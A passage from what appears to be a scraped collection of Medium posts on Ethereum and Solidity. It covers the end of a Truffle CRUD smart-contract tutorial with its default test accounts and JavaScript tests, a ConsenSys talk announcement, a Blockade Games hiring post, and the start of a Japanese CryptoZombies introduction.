0x5aeda56215b167893e80b4fe645ba6d5bab767dePrivate Keys:(0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3(1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f(2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1(3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c(4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418(5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63(6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8(7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7(8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4(9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\u26a0\ufe0f  Important \u26a0\ufe0f  : This mnemonic was created for you by Truffle. It is not secure.Ensure you do not use it on production blockchains, or else you risk losing funds.truffle(develop)>Your accounts and private keys will be different than mine.Now we have accounts ready and our development blockchain spun up, we can test our smart contract.Before that, let\u2019s run few commands and test the balance of our accounts. Replace my account number with your account in the command below.web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d)Result - BigNumber { s: 1, e: 20, c: [ 1000000 ] }As you can see, above command gives result in BigNumber. You need to convert that into number format using .toNumber() function.web3.eth.getBalance(\"0x627306090abab3a6e1400e9345bc60c78a8bef57\").toNumber()Result -  100000000000000000000This shows balance in WEI (smallest ethereum unit / 1 ethereum = 1\u2070\u00b9\u2078 wei). To convert this into the ether, you need to use web3.fromWei() function.web3.fromWei(web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d).toNumber())Result - '100' <<< Number of ethereum on the test account Image sourceNow, we need to deploy our smart contract.You can use either deploy command or migrate command. You don\u2019t need to prefix truffle with commands on truffle CLI.deploy or migrate You can use reset flag ( \u2014 reset) while redeploying your contracts to get the initial state of the blockchain.Test Cases-Now let\u2019s write some test cases to test our smart contract.Create a file CrudApp.js (name should be same as smart contract file) under test directory and copy below code.const CrudApp = artifacts.require('./CrudApp.sol')const assert = require('assert')let crudInstance;contract('CrudApp' , (accounts)  => { beforeEach(async () => {  crudInstance = await CrudApp.deployed() })it('should insert new user' , async() => {  await crudInstance.insert(\"USA\" , \"Trump\", 30000000);const country = await crudInstance.getCountry(\"USA\");  assert.equal(country[0] , \"USA\");  assert.equal(country[1] , \"Trump\");  assert.equal(country[2].toNumber() , 30000000);await crudInstance.updateLeader(\"USA\" , \"Hillary\");const country1 = await crudInstance.getCountry(\"USA\");  assert.equal(country1[0] , \"USA\");  assert.equal(country1[1] , \"Hillary\");  assert.equal(country1[2].toNumber() , 30000000);await crudInstance.deleteCountry(\"USA\");const total = await crudInstance.getTotalCountries();  assert.equal(total , 0); })})Let\u2019s walk through our code and understand it.We imported our contract and assert library, which created an instance of our contract after deploying it (CrudApp.deployed()). Then we simply wrote three test case in which we are testing all four operations.First, we are inserting a record and then updating and deleting it, respectively.You can write test cases in Solidity too, but we choose Javascript, as Truffle makes it easy to test our contract.You can also run few commands directly on Truffle console and also interact with our smart contract using Truffle CLI (Command Line Interface).truffle(develop)>  Above is what we calling Truffle CLI. Running commands on truffle.  Let\u2019s get an instance of our smart contract using this command.CrudApp.deployed().then(function(instance) { crud = instance;})This will give us an instance (crud) of our smart contract, let\u2019s play with it. This instance is simple ABI (Application Binary Unterface) you can check it just printing crud.ABI is the interface between two program modules, one of which is often at the level of machine code. The interface is the de facto method for encoding/decoding data into/out of the machine code.Let\u2019s check the total number of countries by running this command.crud.getTotalCountries().then(function(num){var str= num.toString(); console.log(str)});Let insert a new countrycrud.insert(\"USA\",\"Trump\",30000000);The result should be something like this.{ tx: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',  receipt:    { transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',     transactionIndex: 0,     blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',     blockNumber: 42,     gasUsed: 129230,     cumulativeGasUsed: 129230,     contractAddress: null,     logs: [ [Object] ],     status: '0x01',     logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000008000000000000000000000002000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000' },  logs:    [ { logIndex: 0,       transactionIndex: 0,       transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',       blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',       blockNumber: 42,       address: '0x8f0483125fcb9aaaefa9209d8e9d7b9c8b9fb90f',       type: 'mined',       event: 'CountryEvent',       args: [Object] } ] }This is transaction receipt you can see that our country event gets fired too. Whenever you change blockchain state, it has to be a transaction and transactions consume gas.Now let\u2019s check our entry by running this commandcrud.getCountry(\"USA\");You should see a result something like this.[ 'USA', 'Trump', BigNumber { s: 1, e: 7, c: [ 30000000 ] } ]You\u2019ve now learned how to interact with smart contract, and how to test it!Show me what you\u2019ve built in the comment section.ConclusionWe have learned how to do basic CRUD operations using solidity and test our smart contract. We cut down on details which can be overwhelming for the sake of brevity. Solidity and Truffle have extensive documentation and you should read them. Also, we used web3.js which comes with Truffle bundle.There are multiple ways to optimize our CRUD operations (Hint : you can use an external array). Optimize it and let us know.It\u2019s time for some \ud83d\udc4f.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 1, "tags": ["Ethereum", "Solidity", "Truffle", "Blockchain", "Tutorial"]}, {"title": "An introduction to Ethereum and Solidity with Dave Hoover", "post_link": "https://media.consensys.net/an-introduction-to-ethereum-and-solidity-with-dave-hoover-cb3fb7e43c5e?source=search_post", "author_name": "ConsenSys", "author_link": "https://media.consensys.net/@ConsenSys", "publish_date": "2016-06-14", "last_modified_date": "2018-05-20", "readtime": "0.26", "claps": 7, "voters": 6, "content": "An introduction to Ethereum and Solidity with Dave HooverConsenSysFollowJun 14, 2016 \u00b7 1 min readOn June 7th, veteran Educator Dave Hoover gave a talk at the Chicago Ruby meetup to demonstrate the Solidity programming language. This is an excellent introduction to the subjects of blockchain and Ethereum for experienced coders. Below the video is a PDF of the presentation.Diving into Ethereum and SolidityThank you to the Chicago Ruby group for filming the event.", "responses": 0, "tags": ["Guides", "Technical", "Technical Guide"]}, {"title": "Randall Kanna joins Blockade Games as Solidity Developer for Neon District!", "post_link": "https://medium.com/blockadegames/randall-kanna-joins-blockade-games-as-solidity-developer-for-neon-district-37a6dc6c204d?source=search_post", "author_name": "Chris Tannahill", "author_link": "https://medium.com/@christannahill", "publish_date": "2018-10-08", "last_modified_date": "2018-10-08", "readtime": "1.88", "claps": 203, "voters": 7, "content": "Randall Kanna joins Blockade Games as Solidity Developer for Neon District!Chris TannahillFollowOct 8, 2018 \u00b7 2 min readWelcome to Neon District, Randall! And thanks to Marketing Lead, Alli Torres, for the image edit!The Team at Blockade Games would like to extend a very warm welcome to Blockchain Engineer, Randall Kanna; the new Solidity Developer for Cyberpunk RPG, Neon District.Randall began coding at age 12. She recalls playing Neopets as her earliest exposure to the industry. \u201cI would build webpages every week for my Pirates of the Caribbean themed fan guild and figure out small ways to hack the site with my sister. They had digital currency on there and I still have a few million\u2026 Unfortunately it doesn\u2019t have the same value as Ethereum!\u201dRandall Kanna - Software EngineerSoftware EngineerSoftware Engineerwww.randallkanna.comRandall has been an avid gamer for as long as she can remember. She grew up surrounded by lots of computer games and her Sony PlayStation. Although she admits memory can be sweeter than reality at times. \u201cMy boyfriend and I recently [rediscovered] the PS One. We played some of the early games.. Let me just say, the image quality did not hold up.\u201dAfter completing an internship in college, Kanna got her first engineering job at a ticketing company. Since then she has also completed the B9 Academy Ethereum Developer Course. Combining her career path with her love of coding and experience with digital currencies, she has recently made the jump to fully focus on blockchain.When asked why she chose Neon District, Kanna responded, \u201cI think Marguerite (YT) is so amazing and inspiring. I actually quit my day job to work on this team. I was really excited by the idea and the passion that the team has about it. I\u2019ll be working on the Blockchain side of things in solidity.\u201dA very warm welcome, once again, to Randall Kanna!More from Randall, Blockade Games & Neon DistrictRandall Kanna, Software EngineerBlockade Games WebsiteNeon District WebsiteTwitterFacebookInstagramWriter\u2019s note.As a writer of fact, fiction and pretty much anything else that tickles my fancy, I admire Randall for her abilities; if there\u2019s one thing I know I\u2019ll never be able to write, it\u2019s code.While I was piecing together this article, trying to copy-paste some links, I accidentally fat-fingered the keyboard shortcut to inspect elements. It scared the crap out of me. Coincidentally, that\u2019s about the extend of my coding experience to date.It\u2019s an absolute pleasure to have you on the team, Randall. Thanks for taking some time to share this part of your story with me and everyone on Medium!I look forward to seeing you hit home runs with all the \u201celements\u201d of blockchain I\u2019ll never fully understand!Chris Tannahill \u2014 Writer @ Blockade Games", "responses": 1, "tags": ["Gaming", "Blockchain", "Bitcoin", "Etherum", "Development"]}, {"title": "\u3010Ethereum\u306eSolidity\u8a00\u8a9e\u3011\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\u30b2\u30fc\u30e0\u3067\u5b66\u3076\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8", "post_link": "https://salestechnologylab.com/ethereum%E3%81%AEsolidity%E8%A8%80%E8%AA%9E-%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%BE%E3%83%B3%E3%83%93%E3%83%BC%E3%82%B2%E3%83%BC%E3%83%A0%E3%81%A7%E5%AD%A6%E3%81%B6%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%82%B3%E3%83%B3%E3%83%88%E3%83%A9%E3%82%AF%E3%83%88-40bcb79ddad8?source=search_post", "author_name": "\u91cc\u4e38(SATO___MARU)", "author_link": "https://salestechnologylab.com/@satoyusuke", "publish_date": "2018-01-26", "last_modified_date": "2018-09-14", "readtime": "10.9", "claps": 64, "voters": 6, "content": "\u3010Ethereum\u306eSolidity\u8a00\u8a9e\u3011\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\u30b2\u30fc\u30e0\u3067\u5b66\u3076\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u91cc\u4e38(SATO___MARU)FollowJan 26, 2018 \u00b7 11 min readSource: [Learn to Code Ethereum DApps By Building Your Own Game]Ethereum\uff08\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\uff09\u306eSolidity\u3068\u3044\u3046\u8a00\u8a9e\u3067\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff08\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\uff09\u304c\u5b66\u3079\u308b\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u3068\u3044\u3046\u30b5\u30fc\u30d3\u30b9\u304c\u51fa\u307e\u3057\u305f\u3002CryptoZombies - Learn to code games on Ethereum. Powered by Loom NetworkCryptoZombies is an interactive code school that teaches you to write smart contracts in Solidity through building your\u2026cryptozombies.io\u305d\u3082\u305d\u3082Solidity\u3068\u306f\u4f55\u304b\uff1f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306f\u4f55\u304b\uff1f\u305d\u308c\u306b\u4f34\u3046\u30b5\u30fc\u30d3\u30b9DApps\u3068\u306f\u4f55\u304b\uff1f\u3092\u8aac\u660e\u3057\u305f\u3042\u3068\u3067\u3001\u5b9f\u969b\u306b\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\uff08CryptoZombies\uff09\u306e\u4f7f\u3044\u65b9\u3082\u3044\u304f\u3064\u304b\u89e3\u8aac\u3057\u3066\u3044\u304d\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff08Smart Contract\uff09\u3068\u306f\u305d\u306e\u307e\u307e\u7ffb\u8a33\u3059\u308b\u3068\u3001\u8ce2\u3044\uff08\u30b9\u30de\u30fc\u30c8\u306a\uff09\u5951\u7d04\uff08\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff09\u3068\u306a\u308a\u307e\u3059\u304c\u3001 \u7c21\u5358\u306b\u8a00\u3046\u3068\u300c\u81ea\u52d5\u7684\u306b\u57f7\u884c\u3067\u304d\u308b\u5951\u7d04\u30d7\u30ed\u30b0\u30e9\u30e0 \u300d\u306e\u3053\u3068\u3092\u7dcf\u79f0\u3057\u3066\u547c\u3093\u3067\u3044\u307e\u3059\u30021996\u5e74\u306bNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3068\u3044\u3046\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u30b5\u30a4\u30a8\u30f3\u30b9\u30fb\u6697\u53f7\u5b66\u8005\u30fb\u6cd5\u5b66\u8005\u306b\u3088\u3063\u3066\u63d0\u5531\u3055\u308c\u307e\u3057\u305f\u3002\u3053\u308c\u306f\u3053\u308c\u307e\u3067\u306e\uff13\u3064\u306e\u9769\u547d\uff08\u8fb2\u696d\u9769\u547d\u3001\u7523\u696d\u9769\u547d\u3001\u60c5\u5831\u9769\u547d\uff09\u306b\u5339\u6575\u3059\u308b\u7b2c\uff14\u306e\u9769\u547d\u3068\u307e\u3067\u8a00\u308f\u308c\u3066\u3044\u307e\u3059\u3002\u4ee5\u4e0b\u306e\u52d5\u753b\u3067Nick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u304c\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u3064\u3044\u3066\u8a71\u3057\u3066\u3044\u307e\u3059\u3002\u5b9f\u306f\u30c7\u30b8\u30bf\u30eb\u901a\u8ca8\u3092\u63d0\u5531\u3057\u305f\u306e\u3082\u3053\u306eNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3067\u30011998\u5e74\u306b\u306f\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u547c\u3070\u308c\u308b\u5206\u6563\u578b\u306e\u30c7\u30b8\u30bf\u30eb\u901a\u8ca8\u306e\u8a2d\u8a08\u3082\u767a\u8868\u3057\u307e\u3057\u305f\u3002\u5b9f\u306f\u3053\u306e\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u3044\u3046\u306e\u304c\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3 \u306e\u5148\u99c6\u3051\u7684\u306a\u5206\u6563\u578b\u901a\u8ca8\u3068\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\uff08Bitcoin\uff09\u304b\u3089\u5206\u88c2\u3057\u305f\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u95a2\u4fc2\u3057\u3066\u3044\u308b\u306e\u304b\u306f\u3001\u5206\u304b\u308a\u307e\u305b\u3093\u3002\u5927\u8846\u306e\u4e2d\u3067\u306f\u3001\u3053\u306eNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3053\u305d\u3001Nakamoto Satoshi\u3067\u306f\u306a\u3044\u304b\u3068\u5642\u304c\u5e83\u307e\u308a\u307e\u3057\u305f\u304c\u3001Nick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u306f\u5426\u5b9a\u3057\u3066\u3044\u307e\u3059\u3002\u307e\u305fNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3068Hal Finney\uff08\u30cf\u30eb\u30fb\u30d5\u30a3\u30cb\u30fc\uff09\u304c\u30c1\u30fc\u30e0\u3067\u3084\u3063\u3066\u3044\u305f\u306e\u3067\u306f\u306a\u3044\u304b\u3068\u306e\u30b3\u30e1\u30f3\u30c8\u3082\u4ee5\u4e0b\u306eReddit\u3067\u3084\u308a\u3068\u308a\u3055\u308c\u3066\u3044\u307e\u3059\u3002Source:Why I think Nick Szabo is Satoshi Nakamoto : Bitcoin \u2014 Reddit\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306f\u81ea\u52d5\u8ca9\u58f2\u6a5f\uff1f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u3088\u304f\u51fa\u3066\u304f\u308b\u4f8b\u3048\u306b\u300c\u81ea\u52d5\u8ca9\u58f2\u6a5f\u300d\u304c\u3042\u308a\u307e\u3059\u3002\u81ea\u52d5\u8ca9\u58f2\u6a5f\u3067\u884c\u3063\u3066\u3044\u308b\u4f5c\u696d\uff08\u30d7\u30ed\u30b0\u30e9\u30e0\uff09\u306f\u3001\u30e6\u30fc\u30b6\u30fc\u304c\u304a\u91d1\u3092\u6295\u5165\u3057\u3066\u3001\u8cb7\u3044\u305f\u3044\u5546\u54c1\u306e\u30dc\u30bf\u30f3\u3092\u62bc\u3059\u3002\u3053\u308c\u3067\u81ea\u52d5\u7684\u306b\u76ee\u7684\uff08\u5546\u54c1\u3092\u624b\u306b\u5165\u308c\u308b\uff09\u304c\u57f7\u884c\u3055\u308c\u307e\u3057\u305f\u3002\u30a4\u30e1\u30fc\u30b8\u306f\u4ee5\u4e0b\u3067\u3059\uff08\u30e6\u30fc\u30b6\u30fc\u306e\u7279\u5b9a\u306e\u5546\u54c1\u3092\u81ea\u52d5\u7684\u306b\u57f7\u884c\u3059\u308b\u884c\u70ba\uff09Solidity\uff08\u30bd\u30ea\u30c7\u30a3\u30c6\u30a3\uff09\u3068\u306f\u516c\u5f0f\u30b5\u30a4\u30c8\u306b\u3088\u308b\u3068\u3001solidity\u3068\u306f\u300c\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\u306e\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u5b9f\u88c5\u3059\u308b\u305f\u3081\u306e\u9ad8\u6c34\u6e96\u306a\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u6307\u5411\u8a00\u8a9e\u300d\u306b\u306a\u308a\u307e\u3059\u3002C ++\u3001Python\u3001JavaScript\u306e\u5f71\u97ff\u3092\u53d7\u3051\u3001Ethereum Virtual Machine\uff08EVM\uff09\u7528\u306b\u8003\u6848\u3055\u308c\u307e\u3057\u305f\u3002\u500b\u4eba\u7684\u306b\u3001iOS\u306eSwift\u3001C#\u3092\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3057\u305f\u7d4c\u9a13\u306e\u3042\u308b\u65b9\u3067\u3042\u308c\u3070\u6bd4\u8f03\u7684\u3001\u7c21\u5358\u306b\u66f8\u304f\u3053\u3068\u304c\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u3002Solidity is a contract-oriented, high-level language for implementing smart contracts. It was influenced by C++, Python and JavaScript and is designed to target the Ethereum Virtual Machine (EVM).Soure:Solidity \u2014 Solidity 0.4.20 documentationDApps\uff08\u30c7\u30a3\u30fc\u30a2\u30c3\u30d7\u30b9\uff09\u3068\u306f\u4f55\u304bDApps\u3068\u306f\u3001Decentralized Applications\uff08DApps\uff09\u306e\u982d\u6587\u5b57\u3092\u3068\u3063\u305f\u7565\u8a9e\u3067\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u7528\u3044\u305f\u81ea\u7acb\u5206\u6563\u578b\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3067\u3059\u3002DApps\u306e\u30b5\u30fc\u30d3\u30b9\u3068\u65e2\u5b58\u306e\u30b5\u30fc\u30d3\u30b9\u3068\u306e\u9055\u3044\u306f\u3001\u4e2d\u592e\u96c6\u6a29\u7684\u306a\u7ba1\u7406\u8005\u304c\u5b58\u5728\u3059\u308b\u304b\u5426\u304b\u306b\u3042\u308a\u307e\u3059\u3002\u4f8b\u3048\u3070\u65e2\u5b58\u30b5\u30fc\u30d3\u30b9\u306e\u4e2d\u3067\u63a2\u3057\u3066\u307f\u308b\u3068\u3001\u30bf\u30af\u30b7\u30fc\u914d\u8eca\u30a2\u30d7\u30ea\u306eUber\uff08\u30a6\u30fc\u30d0\u30fc\uff09\u3084\u3001\u6c11\u6cca\u306eAirbnb\uff08\u30a8\u30a2\u30d3\u30fc\u30a2\u30f3\u30c9\u30d3\u30fc\uff09\u306a\u3069\u306f\u3001\u4e2d\u592e\u96c6\u6a29\u7684\u306a\u7ba1\u7406\u8005\u3068\u3057\u3066\u5b58\u5728\u3057\u3066\u3044\u308b\u306e\u3067\u3001DApps\u3067\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u3053\u308c\u3089\u306fDecentralized\uff08\u5206\u6563\u3001\u975e\u4e2d\u592e\u96c6\u6a29\uff1d\u30c7\u30a3\u30bb\u30f3\u30c8\u30e9\u30e9\u30a4\u30ba\u30c9\uff09\u306aApplication\uff08\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\uff09\u3067\u306f\u306a\u304f\u3001Centralized\uff08\u4e2d\u592e\u96c6\u6a29\u7684=\u30bb\u30f3\u30c8\u30e9\u30a4\u30ba\u30c9\uff09\u306a Application\uff08\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\uff09\u3068\u547c\u3070\u308c\u3066\u3044\u307e\u3059\u3002DApps\u306e\u5b9a\u7fa9Dapps\u306b\u306f\u3001\u4ee5\u4e0b\u306e4\u3064\u306e\u5b9a\u7fa9\u304c\u3042\u308a\u307e\u3059\u3002\u307e\u305a\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u3067\u63d0\u4f9b\u3055\u308c\u3066\u3044\u308b\u3053\u3068\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u30c7\u30fc\u30bf\u306f\u5b89\u5fc3\u5b89\u5168\u306b\u5206\u6563\u7684\u306b\u8a18\u9332\u4fdd\u5b58\u3055\u308c\u308b\u3053\u3068\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u30a2\u30af\u30bb\u30b9\u306b\u306f\u30c8\u30fc\u30af\u30f3\u3092\u5229\u7528\u3059\u308b\u3053\u3068\u3002\u53c2\u52a0\u8005\u30ce\u30fc\u30c9\u306b\u306f\u30d7\u30eb\u30fc\u30d5\u30fb\u30aa\u30d6\u30fb\u30ef\u30fc\u30af\uff08proof-of-work=PoW\uff09\u3092\u5831\u916c\u3068\u3057\u3066\u4e0e\u3048\u308b\u3053\u3068\u3002Soure:Decentralized Applications \u2014 dApps | Blockchain Hubb\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u3067\u306f\u65e9\u901f\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306b\u3064\u3044\u3066\u7c21\u5358\u306b\u89e3\u8aac\u3057\u3066\u3044\u304d\u307e\u3059\u3002\u307e\u305f\u5168\u3066\u82f1\u8a9e\u3067\u66f8\u304b\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u82f1\u8a9e\u3082\u5b66\u3073\u305f\u3044\u65b9\u306fSolidity\u8a00\u8a9e\u3068\u540c\u6642\u306b\u5b66\u3093\u3067\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306f\u5b8c\u5168\u306b\u7121\u6599\u3067\u521d\u5fc3\u8005\u306e\u305f\u3081\u306b\u3001\u697d\u3057\u307f\u306b\u306a\u304c\u3089\u30b2\u30fc\u30e0\u611f\u899a\u3067Solidity\u8a00\u8a9e\u3092\u5b66\u3079\u308b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u30b9\u30af\u30fc\u30eb\u3067\u3059\u3002\u5b9f\u969b\u306b\u7121\u6599\u3067\u4f7f\u3063\u3066\u307f\u307e\u3057\u305f\u3002\u4ee5\u4e0b\u306e\u5192\u982d\u306b\u3082\u7121\u6599\u3067\u521d\u5fc3\u8005\u3067\u3082\u7c21\u5358\u306b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u304d\u308b\u3068\u3042\u308a\u307e\u3059\u304c\u3001\u3082\u3057\u5b8c\u5168\u306bHTML\u3084CSS\u3001\u305d\u306e\u4ed6\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u305f\u3053\u3068\u306e\u306a\u3044\u65b9\u306b\u3068\u3063\u3066\u306f\u3001\u96e3\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u305d\u306e\u5834\u5408\u3001\u65e5\u672c\u306e\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u3092\u7d42\u3048\u3066\u304b\u3089\u3001\u518d\u5ea6\u6311\u6226\u3059\u308b\u3053\u3068\u3092\u304a\u3059\u3059\u3081\u3057\u307e\u3059\u3002\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306e\u4f7f\u3044\u65b9\u624b\u9806\u2460\uff1a\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u30b5\u30a4\u30c8\u306e\u300cGet Started, It\u2019s Free\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002\u30da\u30fc\u30b8\u9077\u79fb\u3057\u305f\u3089\u300cLesson 1: Making the Zombie Factory\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u3059\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u753b\u9762\u306b\u306a\u308a\u307e\u3059\u3002\u624b\u9806\u2461\uff1a\u7b2c\uff11\u7ae0\u30ec\u30c3\u30b9\u30f3\u306e\u6982\u8981\u304c\u66f8\u304b\u308c\u3066\u3044\u307e\u3059\u3002\u4e2d\u65ad\u306b\u306f\u30be\u30f3\u30d3DNA\u306e\u4ed5\u7d44\u307f\u3068\u66f8\u304b\u308c\u3066\u3044\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u81ea\u5206\u3067\u8272\u3005\u3044\u3058\u3063\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u30be\u30f3\u30d3\u30ad\u30e3\u30e9\u30af\u30bf\u30fc\u306e\u72b6\u614b\u304c\u5909\u308f\u308a\u307e\u3059\u3002\u624b\u9806\u2462\uff1a\u300cNest Chapter\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002\u7b2c\uff12\u7ae0\u3078\u79fb\u52d5\u3057\u305f\u3089\u3001\u3053\u3053\u304b\u3089\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306e\u30b9\u30bf\u30fc\u30c8\u3067\u3059\u3002\u4ee5\u4e0b\u306b\u753b\u9762\u306e\u898b\u65b9\u306b\u3064\u3044\u3066\u89e3\u8aac\u3057\u3066\u3044\u307e\u3059\u3002\u624b\u9806\u2463\uff1a\u5b9f\u969b\u306b\u30b3\u30fc\u30c9\u3092\u624b\u9806\u306b\u6cbf\u3063\u3066\u304b\u3044\u3066\u307f\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u3059\u308b\u3068\u3001\u4ee5\u4e0b\u306e\u753b\u50cf\u53f3\u4e0b\u306e\u300c\u30d2\u30f3\u30c8\u8868\u793a\u90e8\u5206\u300d\u304c\u8d64\u304f\u306a\u308a\u307e\u3057\u305f\u3002\u3053\u308c\u306f\u3053\u306e\u3042\u305f\u308a\u304c\u9593\u9055\u3063\u3066\u3044\u308b\u3088\u3068\u89aa\u5207\u306b\u6559\u3048\u3066\u304f\u308c\u3066\u3044\u307e\u3059\u3002\u3053\u306e\u8d64\u304f\u5149\u3063\u305f\u90e8\u5206\u3092\u4fee\u6b63\u3059\u308c\u3070\u6b21\u3078\u9032\u3081\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u5206\u304b\u3089\u306a\u3044\u5834\u5408\u306b\u306f\u3001\u5de6\u4e0b\u306b\u3042\u308b\u300cShow me the 